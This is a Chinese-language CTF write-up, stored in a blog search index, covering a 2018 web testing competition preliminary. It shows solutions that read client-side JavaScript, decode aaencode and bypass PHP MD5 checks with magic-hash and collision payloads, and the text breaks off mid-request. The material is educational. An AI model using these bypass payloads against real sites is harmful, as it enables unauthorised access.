<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2018 全国大学生软件测试大赛 安恒杯Web测试大赛 预选赛 部分题解</title>
    <url>/2018-AH-Autumn-Preliminary/</url>
    <content><![CDATA[<p>全国大学生软件测试大赛预选赛。</p>
<p>原题复现大赛。</p>
<span id="more"></span>
<h3 id="x00-输入试试">0x00 输入试试</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自己看看就做出来了 http://114.55.36.69:8003</span><br></pre></td></tr></table></figure>
<p>右键源代码。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Input<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 200px;margin-left: 100px;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;check();&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> flag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;flag&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> str = <span class="string">&quot;d84d9657e5e5e&quot;</span> || <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> str = str + (<span class="string">&quot;ad2ad3fe&quot;</span> &amp;&amp; <span class="number">2</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> str = str + <span class="string">&quot;a2da9494b8&quot;</span> + <span class="string">&quot;ddea4fd4&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> str = str.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (str == flag)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;恭喜你已经找到flag！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>修改一下<strong>JavaScript</strong>代码然后随便输入一个数值即可。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (str != flag)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{4df4aedd8b4949ad2a2e5e5e7569d48d}</strong>。</p>
<h3 id="x01-game">0x01 game</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">玩个蛇皮 http://114.55.36.69:8011</span><br></pre></td></tr></table></figure>
<p>照常是右键源代码。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Game<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./css/game.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;game-area&quot;</span> <span class="attr">tabindex</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./js/game.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> mySnakeBoard = <span class="keyword">new</span> <span class="variable constant_">SNAKE</span>.<span class="title class_">Board</span>(  &#123;</span></span><br><span class="line"><span class="language-javascript">                                            <span class="attr">boardContainer</span>: <span class="string">&quot;game-area&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                                            <span class="attr">fullScreen</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">                                        &#125;);    </span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>没给什么明显信息，一开始以为是藏在<strong>robots.txt</strong>中，但是没有，最后在<strong>JavaScript</strong>中找到如下的<strong>aaencode</strong>加密。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (me.<span class="property">snakeLength</span> &gt; <span class="number">2500</span>)&#123;</span><br><span class="line">ﾟωﾟﾉ= <span class="regexp">/｀ｍ´）ﾉ ~┻━┻   /</span><span class="regexp">/*´∇｀*/</span> [<span class="string">&#x27;_&#x27;</span>]; o=(ﾟｰﾟ)  =_=<span class="number">3</span>; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: <span class="string">&#x27;_&#x27;</span> ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ <span class="string">&#x27;_&#x27;</span>)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [c^_^o];(ﾟДﾟ) [<span class="string">&#x27;c&#x27;</span>] = ((ﾟДﾟ)+<span class="string">&#x27;_&#x27;</span>) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [<span class="string">&#x27;o&#x27;</span>] = ((ﾟДﾟ)+<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [<span class="string">&#x27;c&#x27;</span>]+(ﾟДﾟ) [<span class="string">&#x27;o&#x27;</span>]+(ﾟωﾟﾉ +<span class="string">&#x27;_&#x27;</span>)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [ﾟｰﾟ] + ((ﾟДﾟ) +<span class="string">&#x27;_&#x27;</span>) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ]+((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [<span class="string">&#x27;c&#x27;</span>]+((ﾟДﾟ)+<span class="string">&#x27;_&#x27;</span>) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [<span class="string">&#x27;o&#x27;</span>]+((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ];(ﾟДﾟ) [<span class="string">&#x27;_&#x27;</span>] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+<span class="string">&#x27;_&#x27;</span>) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ]+ (ﾟωﾟﾉ +<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=<span class="string">&#x27;\\&#x27;</span>; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +<span class="string">&#x27;_&#x27;</span>)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=<span class="string">&#x27;\&quot;&#x27;</span>;(ﾟДﾟ) [<span class="string">&#x27;_&#x27;</span>] ( (ﾟДﾟ) [<span class="string">&#x27;_&#x27;</span>] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解码得到。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (me.<span class="property">snakeLength</span> &gt; <span class="number">2500</span>)&#123;</span><br><span class="line"><span class="variable language_">window</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="string">&#x27;Flag&#123;660332922504a5f06dd871a7fe78ba9c&#125;&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Flag&#123; hahahah wrong!! :(&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="x02-简单的md5">0x02 简单的md5</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">简单的md5 http://114.55.36.69:8004</span><br></pre></td></tr></table></figure>
<p>照常是右键源代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">easy MD5 cracking &lt;!--$_POST[&#x27;data1&#x27;]!=$_POST[&#x27;data2&#x27;]--&gt;fail</span><br></pre></td></tr></table></figure>
<p>很简单的MD5加密验证绕过。原理就是利用<strong>PHP</strong>的<strong>==</strong>对比会将<strong>0e</strong>开头的字符串判定为<strong>0</strong>，故全等，<strong>payload</strong>如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data1=QNKCDZO&amp;data2=s878926199a</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{401cf19d304e557349fecda18110c138}</strong>。</p>
<h3 id="x03-传个flag试试">0x03 传个flag试试</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传个flag试试 http://114.55.36.69:8012</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数提交</span><br><span class="line"></span><br><span class="line">flag作为参数以POST方式提交试试?</span><br></pre></td></tr></table></figure>
<p>那就以<strong>POST</strong>提交<strong>flag=1111111111</strong>，得到<strong>flag{858a14671c27804b63e6e96b0acdfdd7}</strong>。</p>
<h3 id="x04-md5">0x04 md5</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5 crash http://114.55.36.69:8006</span><br></pre></td></tr></table></figure>
<p>右键源代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MD5 cracking&lt;!-- <span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;data1&#x27;</span>]!==(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;data2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data2&#x27;</span>]))--&gt;fail</span><br></pre></td></tr></table></figure>
<p>构造绕过。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>114.55.36.69:8006</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://114.55.36.69:8006/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>397</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>0.0.0.0</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">data<span class="number">1</span><span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span 